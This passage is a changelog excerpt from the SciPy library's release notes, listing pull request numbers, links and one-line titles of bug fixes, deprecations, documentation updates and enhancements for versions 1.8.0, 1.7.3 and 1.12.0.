`14789 <https://github.com/scipy/scipy/pull/14789>`__: MAINT: fix a tiny typo in signal/spectral.py\n* `14790 <https://github.com/scipy/scipy/pull/14790>`__: [MRG] BUG: Avoid lobpcg failure when iterations can't continue\n* `14794 <https://github.com/scipy/scipy/pull/14794>`__: Fix typos in bspline docs (and comments)\n* `14796 <https://github.com/scipy/scipy/pull/14796>`__: MAINT: Allow F401 and F403 in module init files\n* `14798 <https://github.com/scipy/scipy/pull/14798>`__: BUG: correct the test loop in test_arpack.eval_evec\n* `14801 <https://github.com/scipy/scipy/pull/14801>`__: CI, MAINT: pin Cython for azure pre-rel\n* `14805 <https://github.com/scipy/scipy/pull/14805>`__: BUG: optimize: fix max function call validation for minimize...\n* `14808 <https://github.com/scipy/scipy/pull/14808>`__: Fix Bug #14807\n* `14814 <https://github.com/scipy/scipy/pull/14814>`__: MAINT:integrate: add upstream quadpack changes\n* `14817 <https://github.com/scipy/scipy/pull/14817>`__: ENH: stats: add geometric zscore\n* `14820 <https://github.com/scipy/scipy/pull/14820>`__: MAINT: Remove \\`np.rollaxis\\` usage with \\`np.moveaxis\\` and...\n* `14821 <https://github.com/scipy/scipy/pull/14821>`__: DOC: Updated documentation for interp1d\n* `14822 <https://github.com/scipy/scipy/pull/14822>`__: Add an array API to scipy.sparse\n* `14832 <https://github.com/scipy/scipy/pull/14832>`__: MAINT: py3.10 in more jobs and bump some 3.8 to 3.9\n* `14833 <https://github.com/scipy/scipy/pull/14833>`__: FIX: raise Python OverflowError exception on Boost.Math error\n* `14836 <https://github.com/scipy/scipy/pull/14836>`__: Bug fix: dqc25f.f\n* `14837 <https://github.com/scipy/scipy/pull/14837>`__: DOC: sparse.linalg: Fixed incorrect comments when the initial...\n* `14838 <https://github.com/scipy/scipy/pull/14838>`__: TST: seed a stats test\n* `14841 <https://github.com/scipy/scipy/pull/14841>`__: MAINT: Increase tolerances in tests to avoid Nightly CPython3.10...\n* `14844 <https://github.com/scipy/scipy/pull/14844>`__: DOC: Add refguide_check option details to runtests.rst\n* `14845 <https://github.com/scipy/scipy/pull/14845>`__: DOC: update a type specifier in a docstring in \\`radau.py\\`\n* `14848 <https://github.com/scipy/scipy/pull/14848>`__: Typo \"copmlex\"\n* `14852 <https://github.com/scipy/scipy/pull/14852>`__: DOC: Fix documentation bugs in \\`lstsq\\`\n* `14860 <https://github.com/scipy/scipy/pull/14860>`__: minimize: copy user constraints if parameter is factored out....\n* `14865 <https://github.com/scipy/scipy/pull/14865>`__: BUG: stats: Fix a crash in stats.skew\n* `14868 <https://github.com/scipy/scipy/pull/14868>`__: [MRG] BUG: Update lobpcg.py to validate the accuracy and issue...\n* `14871 <https://github.com/scipy/scipy/pull/14871>`__: MAINT: removed a pitfall where a built-in name was being shadowed\n* `14872 <https://github.com/scipy/scipy/pull/14872>`__: DEP: Deprecate private namespaces in \\`scipy.linalg\\`\n* `14878 <https://github.com/scipy/scipy/pull/14878>`__: TST: bump rtol for equal_bounds\n* `14881 <https://github.com/scipy/scipy/pull/14881>`__: DEP: Deprecate private namespaces in \\`scipy.special\\`\n* `14882 <https://github.com/scipy/scipy/pull/14882>`__: BUG: Convert TNC C module to cython\n* `14883 <https://github.com/scipy/scipy/pull/14883>`__: DOC:linalg: Clarify driver defaults in eigh\n* `14884 <https://github.com/scipy/scipy/pull/14884>`__: BUG: optimize: add missing attributes of \\`OptimizeResult\\` for...\n* `14892 <https://github.com/scipy/scipy/pull/14892>`__: DOC: Correct docs for Hausdorff distance\n* `14898 <https://github.com/scipy/scipy/pull/14898>`__: DEP: Deprecate private namespace in \\`scipy.stats\\`\n* `14902 <https://github.com/scipy/scipy/pull/14902>`__: MAINT:linalg: Rename func to \"bandwidth\"\n* `14906 <https://github.com/scipy/scipy/pull/14906>`__: DEP: Deprecate private namespace in \\`scipy.constants\\`\n* `14913 <https://github.com/scipy/scipy/pull/14913>`__: DEP: Deprecate private namespace in \\`scipy.fftpack\\`\n* `14916 <https://github.com/scipy/scipy/pull/14916>`__: DEP: Deprecate \\`stats.biasedurn\\` and make it private\n* `14918 <https://github.com/scipy/scipy/pull/14918>`__: DEP: Deprecate private namespaces in \\`\\`scipy.interpolate\\`\\`\n* `14919 <https://github.com/scipy/scipy/pull/14919>`__: DEP: Deprecate private namespaces in \\`scipy.integrate\\`\n* `14920 <https://github.com/scipy/scipy/pull/14920>`__: Fix for complex Fresnel\n* `14923 <https://github.com/scipy/scipy/pull/14923>`__: DEP: Deprecate private namespaces in \\`\\`scipy.spatial\\`\\`\n* `14924 <https://github.com/scipy/scipy/pull/14924>`__: Fix extent for scipy.signal.cwt example\n* `14925 <https://github.com/scipy/scipy/pull/14925>`__: MAINT: Ignore build generated files in \\`\\`scipy.stats\\`\\`\n* `14927 <https://github.com/scipy/scipy/pull/14927>`__: DEP: Deprecate private namespaces in \\`scipy.misc\\`\n* `14928 <https://github.com/scipy/scipy/pull/14928>`__: MAINT: fix runtest.py overriding \\`$PYTHONPATH\\`: prepend instead\n* `14934 <https://github.com/scipy/scipy/pull/14934>`__: BUG: optimize: add a missing attribute of OptimizeResult in \\`basinhopping\\`\n* `14939 <https://github.com/scipy/scipy/pull/14939>`__: DEP: Deprecate private namespaces in \\`\\`scipy.sparse\\`\\`\n* `14941 <https://github.com/scipy/scipy/pull/14941>`__: ENH: optimize: add optional parameters of adaptive step size...\n* `14943 <https://github.com/scipy/scipy/pull/14943>`__: DOC: clarify mac pytest; add blank line\n* `14944 <https://github.com/scipy/scipy/pull/14944>`__: BUG: MultivariateNormalQMC with specific QMCEngine remove unneeded...\n* `14947 <https://github.com/scipy/scipy/pull/14947>`__: DOC: adding example to decimate function\n* `14950 <https://github.com/scipy/scipy/pull/14950>`__: MAINT: Use matmul binary operator in scipy.sparse.linalg\n* `14954 <https://github.com/scipy/scipy/pull/14954>`__: DOC: Add missing params to minres docstring.\n* `14955 <https://github.com/scipy/scipy/pull/14955>`__: BUG: stats: fix broadcasting behavior of argsreduce\n* `14960 <https://github.com/scipy/scipy/pull/14960>`__: Update links for new site\n* `14961 <https://github.com/scipy/scipy/pull/14961>`__: CI: use https protocol for git in CircleCI\n* `14962 <https://github.com/scipy/scipy/pull/14962>`__: DEP: Deprecate private namespaces in \\`scipy.signal\\`\n* `14963 <https://github.com/scipy/scipy/pull/14963>`__: MAINT: \\`integrate.lsoda\\` missing in .gitignore\n* `14965 <https://github.com/scipy/scipy/pull/14965>`__: DOC: update logo and add favicon.\n* `14966 <https://github.com/scipy/scipy/pull/14966>`__: DEP: Deprecate private namespaces in \\`\\`scipy.optimize\\`\\`\n* `14969 <https://github.com/scipy/scipy/pull/14969>`__: CI: Fixes pyparsing version in doc build\n* `14972 <https://github.com/scipy/scipy/pull/14972>`__: Don't put space after directive name.\n* `14979 <https://github.com/scipy/scipy/pull/14979>`__: BUG: scipy.sparse.linalg.spsolve: fix memory error caused from...\n* `14988 <https://github.com/scipy/scipy/pull/14988>`__: BLD: update pyproject.toml for Python 3.10\n* `14989 <https://github.com/scipy/scipy/pull/14989>`__: ENH: Speed up knot interval lookup for BSpline.design_matrix\n* `14992 <https://github.com/scipy/scipy/pull/14992>`__: Pythranized version of _matfuncs_sqrtm\n* `14993 <https://github.com/scipy/scipy/pull/14993>`__: MAINT: forward port 1.7.2 relnotes\n* `15004 <https://github.com/scipy/scipy/pull/15004>`__: ENH: Make \\`get_matfile_version\\` and other \\`io.matlab\\` objects...\n* `15007 <https://github.com/scipy/scipy/pull/15007>`__: DOC: add missing \"regularized\" to \\`gammainccinv\\` documentation\n* `15008 <https://github.com/scipy/scipy/pull/15008>`__: MAINT: restore access to deprecated private namespaces\n* `15010 <https://github.com/scipy/scipy/pull/15010>`__: TST: remove fragile test which checks if g77 is linked\n* `15013 <https://github.com/scipy/scipy/pull/15013>`__: MAINT: Fix use-after-free bug in Py_FindObjects\n* `15018 <https://github.com/scipy/scipy/pull/15018>`__: CI: Work around Sphinx bug\n* `15019 <https://github.com/scipy/scipy/pull/15019>`__: Finite Difference Hessian in Scipy Optimize Solvers (Newton-CG)\n* `15020 <https://github.com/scipy/scipy/pull/15020>`__: ENH: sparse.linalg: Fixed the issue that the initial guess \"x0\"...\n* `15022 <https://github.com/scipy/scipy/pull/15022>`__: DOC: mitigate newton optimization not converging.\n* `15023 <https://github.com/scipy/scipy/pull/15023>`__: CI: Unpin Sphinx\n* `15027 <https://github.com/scipy/scipy/pull/15027>`__: DOC: linalg: Fix a small condition doc error\n* `15029 <https://github.com/scipy/scipy/pull/15029>`__: DEP: Deprecate private namespaces in \\`scipy.sparse.linalg\\`\n* `15034 <https://github.com/scipy/scipy/pull/15034>`__: DOC: use numpydoc format for C function in \\`_superlumodule.c\\`\n* `15035 <https://github.com/scipy/scipy/pull/15035>`__: MAINT: simplify UNU.RAN api in stats\n* `15037 <https://github.com/scipy/scipy/pull/15037>`__: New example for gaussian_filter\n* `15040 <https://github.com/scipy/scipy/pull/15040>`__: MAINT: Add test for public API\n* `15041 <https://github.com/scipy/scipy/pull/15041>`__: DOC: Add warning to dct documentation about norm='ortho'\n* `15045 <https://github.com/scipy/scipy/pull/15045>`__: DOC: update toolchain.rst\n* `15053 <https://github.com/scipy/scipy/pull/15053>`__: TST: Add some test skips to get wheel builder CI green again\n* `15054 <https://github.com/scipy/scipy/pull/15054>`__: MAINT: Remove wminkowski\n* `15055 <https://github.com/scipy/scipy/pull/15055>`__: ENH: allow p>0 for Minkowski distance\n* `15061 <https://github.com/scipy/scipy/pull/15061>`__: MAINT:sparse: expm() fix redundant imports\n* `15062 <https://github.com/scipy/scipy/pull/15062>`__: MAINT:BLD: Open file in text mode for tempita\n* `15066 <https://github.com/scipy/scipy/pull/15066>`__: CI: bump gcc from 4.8 to 6\n* `15067 <https://github.com/scipy/scipy/pull/15067>`__: DOC: Update broken link to SuperLU library.\n* `15078 <https://github.com/scipy/scipy/pull/15078>`__: MAINT: update \\`stats.iqr\\` for deprecated \\`np.percentile\\`...\n* `15083 <https://github.com/scipy/scipy/pull/15083>`__: MAINT: stats: separate UNU.RAN functionality to its own submodule\n* `15084 <https://github.com/scipy/scipy/pull/15084>`__: MAINT: Include \\`scipy.io.matlab\\` in public API\n* `15085 <https://github.com/scipy/scipy/pull/15085>`__: ENH: support creation of analog SOS outputs\n* `15087 <https://github.com/scipy/scipy/pull/15087>`__: TST: Review \\`\\`_assert_within_tol\\`\\` positional arguments\n* `15095 <https://github.com/scipy/scipy/pull/15095>`__: MAINT: update gitignore to ignore private directories\n* `15099 <https://github.com/scipy/scipy/pull/15099>`__: MAINT: ScalarFunction remember best_x\n* `15100 <https://github.com/scipy/scipy/pull/15100>`__: MAINT: Include \\`stats.contingency\\` in public API\n* `15102 <https://github.com/scipy/scipy/pull/15102>`__: ENH: Add orthogonalize argument to DCT/DST\n* `15105 <https://github.com/scipy/scipy/pull/15105>`__: MAINT: Add missing imports in deprecated modules\n* `15107 <https://github.com/scipy/scipy/pull/15107>`__: BUG: Update chi_gen to use scipy.special.gammaln\n* `15109 <https://github.com/scipy/scipy/pull/15109>`__: MAINT: remove NaiveRatioUniforms from scipy.stats\n* `15111 <https://github.com/scipy/scipy/pull/15111>`__: ENH: Add special.log_expit and use it in stats.logistic\n* `15112 <https://github.com/scipy/scipy/pull/15112>`__: DOC: update 'Wn' definition in signal.butter\n* `15114 <https://github.com/scipy/scipy/pull/15114>`__: DOC: added Fermi-Dirac distribution by name\n* `15119 <https://github.com/scipy/scipy/pull/15119>`__: DOC: fix symlink to \\`logistic.sf\\` in \\`stats.logistic\\`\n* `15120 <https://github.com/scipy/scipy/pull/15120>`__: MAINT: Install \\`sparse.linalg._eigen\\` tests and fix test failures\n* `15123 <https://github.com/scipy/scipy/pull/15123>`__: MAINT: interpolate: move the \\`sparse\\` dependency from cython...\n* `15127 <https://github.com/scipy/scipy/pull/15127>`__: DOC: update linux build instructions to mention C++\n* `15134 <https://github.com/scipy/scipy/pull/15134>`__: DOC: Improve Lomb-Scargle example\n* `15135 <https://github.com/scipy/scipy/pull/15135>`__: ENH: Carlson symmetric elliptic integrals.\n* `15137 <https://github.com/scipy/scipy/pull/15137>`__: DOC: special: Add 'Examples' to multigammaln and roots_legendre...\n* `15139 <https://github.com/scipy/scipy/pull/15139>`__: Use constrained_layout in Lomb-Scargle example\n* `15142 <https://github.com/scipy/scipy/pull/15142>`__: ENH: stats.sampling: add SROU method\n* `15143 <https://github.com/scipy/scipy/pull/15143>`__: MAINT: Remove some unused imports.\n* `15144 <https://github.com/scipy/scipy/pull/15144>`__: BUG: Add missing import of 'errno' to runtests.py\n* `15157 <https://github.com/scipy/scipy/pull/15157>`__: ENH: rebased version of gh-14279\n* `15159 <https://github.com/scipy/scipy/pull/15159>`__: DOC: stats: fix a header in \\`stats.sampling\\` tutorial\n* `15161 <https://github.com/scipy/scipy/pull/15161>`__: DOC: 1.8.0 relnotes update\n* `15175 <https://github.com/scipy/scipy/pull/15175>`__: MAINT: 1.8.0 backports for relnotes and .gitignore\n* `15181 <https://github.com/scipy/scipy/pull/15181>`__: BUG: The pytest decorator for conditional skipping is 'skipif'\n* `15191 <https://github.com/scipy/scipy/pull/15191>`__: MAINT: version bounds before 1.8.0rc1\n* `15192 <https://github.com/scipy/scipy/pull/15192>`__: MAINT: Replace use of \\`pytest.warns(None)\\` with \\`warnings.catch_warnings\\`\n* `15194 <https://github.com/scipy/scipy/pull/15194>`__: BUG: stats: Fix numerical issues of recipinvgauss\n* `15214 <https://github.com/scipy/scipy/pull/15214>`__: TST: sparse.linalg: store only PROPACK test matrices; generate...\n* `15220 <https://github.com/scipy/scipy/pull/15220>`__: BUG: sparse.linalg: Fix deprecation warnings.\n* `15225 <https://github.com/scipy/scipy/pull/15225>`__: Make 0th power of a sparse array/matrix return the identity with...\n* `15229 <https://github.com/scipy/scipy/pull/15229>`__: BUG: minimize should work with a scalar closes #15228\n* `15232 <https://github.com/scipy/scipy/pull/15232>`__: BUG: Add rmul for sparse arrays\n* `15236 <https://github.com/scipy/scipy/pull/15236>`__: BLD: update setup.py for Python 3.10\n* `15248 <https://github.com/scipy/scipy/pull/15248>`__: MAINT: 1.8.0rc2 backports\n* `15249 <https://github.com/scipy/scipy/pull/15249>`__: FIX: PROPACK MKL compatibility\n* `15253 <https://github.com/scipy/scipy/pull/15253>`__: BUG: special: fix \\`stdtr\\` and \\`stdtrit\\` for infinite df\n* `15256 <https://github.com/scipy/scipy/pull/15256>`__: MAINT: use PEP440 vs. distutils\n* `15268 <https://github.com/scipy/scipy/pull/15268>`__: CI: pin setuptools to 59.6.0 and Pythran to 0.10.0 for Windows...\n* `15270 <https://github.com/scipy/scipy/pull/15270>`__: MAINT: rename \\`moduleTNC\\` extension back to \\`_moduleTNC\\`\n* `15271 <https://github.com/scipy/scipy/pull/15271>`__: TST: slightly bump test tolerance for a new lobpcg test\n* `15275 <https://github.com/scipy/scipy/pull/15275>`__: MAINT: Fix imports in \\`signal._signaltools\\`\n* `15278 <https://github.com/scipy/scipy/pull/15278>`__: MAINT: remove non-default settings (except \\`shallow\\`) in \\`.gitmodules\\`\n* `15288 <https://github.com/scipy/scipy/pull/15288>`__: BLD Respect the --skip-build flag in setup.py\n* `15293 <https://github.com/scipy/scipy/pull/15293>`__: BUG: fix Hausdorff int overflow\n* `15301 <https://github.com/scipy/scipy/pull/15301>`__: TST: update \\`sparse.linalg\\` tests for failures due to tolerances\n* `15318 <https://github.com/scipy/scipy/pull/15318>`__: BLD: update pyproject.toml to not pin numpy for aarch64 + PyPy\n* `15322 <https://github.com/scipy/scipy/pull/15322>`__: BLD: update minimum Pythran version to 0.10.0 for SciPy 1.8.0\n* `15323 <https://github.com/scipy/scipy/pull/15323>`__: MAINT: filter RuntimeWarnings in stats functions\n* `15328 <https://github.com/scipy/scipy/pull/15328>`__: MAINT: interpolate: csr_matrix -> csr_array\n* `15331 <https://github.com/scipy/scipy/pull/15331>`__: BUG: stats._unuran: fix invalid attribute lookups\n* `15332 <https://github.com/scipy/scipy/pull/15332>`__: CI: pin numpy to 1.21.5 for the doc build on CircleCI\n* `15334 <https://github.com/scipy/scipy/pull/15334>`__: BUG: stats._unuran: fix remaining attribute lookup errors\n* `15335 <https://github.com/scipy/scipy/pull/15335>`__: CI: pin numpy to 1.21.5 in the Azure refguide check job\n* `15341 <https://github.com/scipy/scipy/pull/15341>`__: BUG: \\`highs-ds\\` returns memoryviews instead of np.arrays for...\n* `15397 <https://github.com/scipy/scipy/pull/15397>`__: BUG: ensured vendored pep440 is imported\n* `15416 <https://github.com/scipy/scipy/pull/15416>`__: BUG: Fix PyUFunc for wasm targets\n* `15418 <https://github.com/scipy/scipy/pull/15418>`__: MAINT: 1.8.0 rc3 backports round 1\n* `15421 <https://github.com/scipy/scipy/pull/15421>`__: BUG: stats: mode: fix negative axis issue with np.moveaxis instead...\n* `15432 <https://github.com/scipy/scipy/pull/15432>`__: MAINT: release branch PROPACK switch (default off)\n* `15515 <https://github.com/scipy/scipy/pull/15515>`__: MAINT: fix broken link and remove CI badges\n\n\n\n==========================\n", "1.7.3": "-----------------------\n\n* `14990 <https://github.com/scipy/scipy/pull/14990>`__: BLD: update pyproject.toml for Python 3.10 changes\n* `15086 <https://github.com/scipy/scipy/pull/15086>`__: BUG: out of bounds indexing in stats.qmc.update_discrepancy\n* `15090 <https://github.com/scipy/scipy/pull/15090>`__: MAINT: skip a few failing tests in \\`1.7.x\\` for macOS arm64\n\n\n==========================\n", "1.12.0": "************************\n\n* `12680 <https://github.com/scipy/scipy/pull/12680>`__: ENH: stats: add nonparametric one-sample quantile test and CI\n* `14103 <https://github.com/scipy/scipy/pull/14103>`__: DOC: integrate: Add complex matrix DE solution to examples\n* `14552 <https://github.com/scipy/scipy/pull/14552>`__: BUG: Fix LSODA interpolation scheme\n* `17408 <https://github.com/scipy/scipy/pull/17408>`__: ENH: Short-Time Fourier Transform (STFT) Enhancements\n* `17452 <https://github.com/scipy/scipy/pull/17452>`__: ENH: Add the __pow__ operator for Rotations\n* `17460 <https://github.com/scipy/scipy/pull/17460>`__: ENH: New Rotation method approx_equal()\n* `17473 <https://github.com/scipy/scipy/pull/17473>`__: ENH: stats: multivariate Wasserstein distance/EMD\n* `17495 <https://github.com/scipy/scipy/pull/17495>`__: DOC: Optimize: update DE documentation\n* `17542 <https://github.com/scipy/scipy/pull/17542>`__: ENH: Extend Rotation.align_vectors() to allow an infinite weight,...\n* `17697 <https://github.com/scipy/scipy/pull/17697>`__: ENH: special: Improvements for the incomplete beta functions.\n* `17719 <https://github.com/scipy/scipy/pull/17719>`__: ENH: Add Chandrupatla's algorithm to optimize._zeros_py.py to...\n* `17722 <https://github.com/scipy/scipy/pull/17722>`__: ENH add pava and isotonic_regression\n* `17728 <https://github.com/scipy/scipy/pull/17728>`__: ENH: Implemented Rotation.from_davenport and Rotation.as_davenport\n* `17757 <https://github.com/scipy/scipy/pull/17757>`__: DOC: clarify input dimensions for \\`directed_hausdorff\\` method\n* `17955 <https://github.com/scipy/scipy/pull/17955>`__: ENH: add simplified fast numerical inversion to stats.sampling\n* `18103 <https://github.com/scipy/scipy/pull/18103>`__: ENH: add stirling2 function to \\`scipy.special\\`\n* `18133 <https://github.com/scipy/scipy/pull/18133>`__: BUG: Fix fails of some tests and bad behaviour for x=zeta in...\n* `18151 <https://github.com/scipy/scipy/pull/18151>`__: ENH: add cumulative_simpson integration to scipy.integrate\n* `18156 <https://github.com/scipy/scipy/pull/18156>`__: ENH: Added loggamma entropy method\n* `18197 <https://github.com/scipy/scipy/pull/18197>`__: ENH: Add derivatives for BarycentricInterpolator\n* `18219 <https://github.com/scipy/scipy/pull/18219>`__: DEP: integrate: Deprecate \\`initial\\` values other than None...\n* `18348 <https://github.com/scipy/scipy/pull/18348>`__: ENH: add private function to bracket root of monotonic function\n* `18361 <https://github.com/scipy/scipy/pull/18361>`__: ENH: add \\`fit\\` method to \\`multivariate_normal\\`\n* `18363 <https://github.com/scipy/scipy/pull/18363>`__: ENH: stats: add Baumgartner-Weiss-Schindler test\n* `18376 <https://github.com/scipy/scipy/pull/18376>`__: ENH: CloughTocher2DInterpolator multiple times with different...\n* `18465 <https://github.com/scipy/scipy/pull/18465>`__: ENH: asymptotic expansion for multivariate t entropy\n* `18470 <https://github.com/scipy/scipy/pull/18470>`__: ENH: stats.anderson_ksamp: re-add permutation version of test\n* `18477 <https://github.com/scipy/scipy/pull/18477>`__: DOC: stats.truncnorm: add example about truncation points\n* `18481 <https://github.com/scipy/scipy/pull/18481>`__: MAINT: differentiable fns respect float width. Closes #15602\n* `18488 <https://github.com/scipy/scipy/pull/18488>`__: MAINT:ENH:sparse.linalg: Rewrite iterative solvers in Python,...\n* `18492 <https://github.com/scipy/scipy/pull/18492>`__: Add NdBSpline: n-dim tensor product b-spline object\n* `18496 <https://github.com/scipy/scipy/pull/18496>`__: ENH: Faster _select_samples in _differential_evolution.py\n* `18499 <https://github.com/scipy/scipy/pull/18499>`__: ENH: asymptotic expansion for beta entropy for large a and b\n* `18544 <https://github.com/scipy/scipy/pull/18544>`__: ENH: sparse.linalg: Implement matrix_power()\n* `18552 <https://github.com/scipy/scipy/pull/18552>`__: DOC: stats.laplace_asymmetric: note relationship between scale...\n* `18570 <https://github.com/scipy/scipy/pull/18570>`__: ENH:optimize: Rewrite nnls in Python\n* `18571 <https://github.com/scipy/scipy/pull/18571>`__: ENH: linalg: Add wrapper for \\`?tgsyl\\`\n* `18575 <https://github.com/scipy/scipy/pull/18575>`__: REL: set version to 1.12.0.dev0\n* `18585 <https://github.com/scipy/scipy/pull/18585>`__: DOC: stats.rv_discrete: note that default methods are not compatible...\n* `18586 <https://github.com/scipy/scipy/pull/18586>`__: ENH: override sf for rdist distribution\n* `18587 <https://github.com/scipy/scipy/pull/18587>`__: DEP: signal: deprecate cmplx_sort\n* `18589 <https://github.com/scipy/scipy/pull/18589>`__: DEP: remove parameter centered of stats.qmc.LatinHypercube\n* `18594 <https://github.com/scipy/scipy/pull/18594>`__: DOC: more explicit example usage of scipy.linalg.lu_factor\n* `18602 <https://github.com/scipy/scipy/pull/18602>`__: MAINT: stats.hypergeom.mean: correct for large args\n* `18606 <https://github.com/scipy/scipy/pull/18606>`__: ENH: override sf for Pearson3 distribution\n* `18609 <https://github.com/scipy/scipy/pull/18609>`__: TST: update nonlin tests for sparse arrays\n* `18610 <https://github.com/scipy/scipy/pull/18610>`__: DEP: stats: remove deprecated binom_test\n* `18612 <https://github.com/scipy/scipy/pull/18612>`__: DEP: stats.iqr: remove deprecated \\`scale='raw'\\`\n* `18613 <https://github.com/scipy/scipy/pull/18613>`__: BUG: fix ortho mode in DST type 2/3\n* `18614 <https://github.com/scipy/scipy/pull/18614>`__: MAINT: don't override sf for loguniform/reciprocal distribution\n* `18616 <https://github.com/scipy/scipy/pull/18616>`__: ENH: override sf in loglaplace distribution\n* `18617 <https://github.com/scipy/scipy/pull/18617>`__: MAINT: interpolate: delete duplicated FITPACK bisplev interface\n* `18620 <https://github.com/scipy/scipy/pull/18620>`__: MAINT: signal: avoid eval/exec in hilbert2\n* `18622 <https://github.com/scipy/scipy/pull/18622>`__: MAINT: Move rvs_ratio_uniforms to sampling\n* `18624 <https://github.com/scipy/scipy/pull/18624>`__: DEP: adjust deprecation of positional arguments\n* `18631 <https://github.com/scipy/scipy/pull/18631>`__: ENH: Add \\`fast_matrix_market\\` to scipy.io\n* `18633 <https://github.com/scipy/scipy/pull/18633>`__: BUG: Fix issue levy_stable.pdf\n* `18640 <https://github.com/scipy/scipy/pull/18640>`__: MAINT: Fix lint warnings in \\`_traversal.pyx\\`\n* `18641 <https://github.com/scipy/scipy/pull/18641>`__: ENH: makes \\`_covariance\\` a cached property\n* `18649 <https://github.com/scipy/scipy/pull/18649>`__: DEP: scipy.stats.morestats: clarify deprecation warnings\n* `18652 <https://github.com/scipy/scipy/pull/18652>`__: BUG: Fixes how the length of argument x of linalg.blas.?gbmv...\n* `18653 <https://github.com/scipy/scipy/pull/18653>`__: DOC: Add missing equal sign to Lomb-Scargle periodogram equation\n* `18661 <https://github.com/scipy/scipy/pull/18661>`__: CI: update \\`SCIPY_NIGHTLY_UPLOAD_TOKEN\\` on CirrusCI.\n* `18664 <https://github.com/scipy/scipy/pull/18664>`__: ENH: stats.dirichlet: add covariance method\n* `18666 <https://github.com/scipy/scipy/pull/18666>`__: DEV: update environment.yml, removing setuptools\n* `18667 <https://github.com/scipy/scipy/pull/18667>`__: DEV: Add Windows specific instructions to environment.yml\n* `18668 <https://github.com/scipy/scipy/pull/18668>`__: ENH: add machinery to support Array API\n* `18670 <https://github.com/scipy/scipy/pull/18670>`__: MAINT: signal: deduplicate \\*ord functions\n* `18677 <https://github.com/scipy/scipy/pull/18677>`__: TST: linalg: improve seeding of some tests that are a problem...\n* `18679 <https://github.com/scipy/scipy/pull/18679>`__: MAINT:stats:Cythonize and remove Fortran statlib code\n* `18682 <https://github.com/scipy/scipy/pull/18682>`__: TST: stats: fix xslow test failures\n* `18686 <https://github.com/scipy/scipy/pull/18686>`__: DEV: Add ability to run memory benchmarks on macOS\n* `18689 <https://github.com/scipy/scipy/pull/18689>`__: CI: test with Python 3.12-beta\n* `18690 <https://github.com/scipy/scipy/pull/18690>`__: DOC: mention that \\`genlogistic\\` is one of several types of...\n* `18692 <https://github.com/scipy/scipy/pull/18692>`__: MAINT: signal: replace \\`np.r_[\"-1\", arrays]\\` by a more sane...\n* `18694 <https://github.com/scipy/scipy/pull/18694>`__: DOC: signal: Updated Chebyshev 2 documentation\n* `18695 <https://github.com/scipy/scipy/pull/18695>`__: ENH: override halflogistic fit for free parameters\n* `18696 <https://github.com/scipy/scipy/pull/18696>`__: MAINT Fix broken link in scipy.optimize._differentialevolution.py\n* `18699 <https://github.com/scipy/scipy/pull/18699>`__: DEP: integrate: deprecate old aliases\n* `18705 <https://github.com/scipy/scipy/pull/18705>`__: MAINT Optimize link in scipy.optimize._differentialevolution.py\n* `18706 <https://github.com/scipy/scipy/pull/18706>`__: DOC: linalg: various doc improvements\n* `18708 <https://github.com/scipy/scipy/pull/18708>`__: MAINT: signal/dlsim: avoid using interp1d; use make_interp_spline...\n* `18710 <https://github.com/scipy/scipy/pull/18710>`__: MAINT: remove np.r_[\"-1\", ...]\n* `18712 <https://github.com/scipy/scipy/pull/18712>`__: MAINT: bump minimal supported NumPy version to 1.22.4\n* `18713 <https://github.com/scipy/scipy/pull/18713>`__: MAINT: fix linter error in \\`_fitpack_impl.py\\`\n* `18714 <https://github.com/scipy/scipy/pull/18714>`__: ENH: Improve beta entropy when one argument is large\n* `18715 <https://github.com/scipy/scipy/pull/18715>`__: MAINT: signal: remove duplicated _atleast_2d_or_none\n* `18718 <https://github.com/scipy/scipy/pull/18718>`__: TST: mark two tests of \\`lsq_linear\\` as xslow\n* `18719 <https://github.com/scipy/scipy/pull/18719>`__: MAINT: optimize._chandrupatla: result object fixup\n* `18720 <https://github.com/scipy/scipy/pull/18720>`__: DOC: Fix notational variation in _lbfgsb_py.py: \"pg_i\" and \"proj...\n* `18723 <https://github.com/scipy/scipy/pull/18723>`__: MAINT:sparse.linalg: Use _NoValue for deprecated kwargs\n* `18726 <https://github.com/scipy/scipy/pull/18726>`__: ENH: improve halflogistic distribution fitting with fixed parameters\n* `18727 <https://github.com/scipy/scipy/pull/18727>`__: MAINT: Add skip CI link to PR template\n* `18728 <https://github.com/scipy/scipy/pull/18728>`__: MAINT: optimize._chandrupatla: refactor for code reuse\n* `18729 <https://github.com/scipy/scipy/pull/18729>`__: DOC: Add note connecting weibull_min to standard exponential.\n* `18734 <https://github.com/scipy/scipy/pull/18734>`__: MAINT: Update codeowners\n* `18742 <https://github.com/scipy/scipy/pull/18742>`__: ENH: differential_evolution callback accepts intermediate_result\n* `18744 <https://github.com/scipy/scipy/pull/18744>`__: TST:sparse.linalg:Relax test_hermitian_modes tolerances\n* `18746 <https://github.com/scipy/scipy/pull/18746>`__: MAINT: forward port 1.11.0 relnotes\n* `18755 <https://github.com/scipy/scipy/pull/18755>`__: ENH: override isf for Burr distribution\n* `18756 <https://github.com/scipy/scipy/pull/18756>`__: DOC: stats.boxcox_normmax: correct minimize -> maximize\n* `18758 <https://github.com/scipy/scipy/pull/18758>`__: DOC: Document performance cliff for scipy.sparse.random\n* `18760 <https://github.com/scipy/scipy/pull/18760>`__: ENH: override halfnorm fit\n* `18764 <https://github.com/scipy/scipy/pull/18764>`__: ENH: stats: add informative error message to \\`boxcox_normmax\\`...\n* `18771 <https://github.com/scipy/scipy/pull/18771>`__: Fix typo from #18758\n* `18777 <https://github.com/scipy/scipy/pull/18777>`__: DOC: Clarify Prewitt filter\n* `18783 <https://github.com/scipy/scipy/pull/18783>`__: ENH: stats: Implement _sf and _isf for hypsecant.\n* `18786 <https://github.com/scipy/scipy/pull/18786>`__: MAINT: forward port 1.11.1 relnotes\n* `18794 <https://github.com/scipy/scipy/pull/18794>`__: MAINT: fix \\`halflogistic.fit\\` for bad location guess\n* `18795 <https://github.com/scipy/scipy/pull/18795>`__: BUG, DOC: Correct \\`adsurl\\` value and add a general \\`url\\`...\n* `18799 <https://github.com/scipy/scipy/pull/18799>`__: ENH: simplify \\`gausshyper.pdf\\`\n* `18802 <https://github.com/scipy/scipy/pull/18802>`__: MAINT: Use \\`sparse.diags\\` instead of \\`spdiags\\` internally.\n* `18803 <https://github.com/scipy/scipy/pull/18803>`__: MAINT: \\`rv_discrete\\` should raise with duplicate \\`xk\\` in...\n* `18807 <https://github.com/scipy/scipy/pull/18807>`__: ENH: remove unnecessary root-find from skewnorm\n* `18808 <https://github.com/scipy/scipy/pull/18808>`__: TST: test for gh-18800\n* `18812 <https://github.com/scipy/scipy/pull/18812>`__: 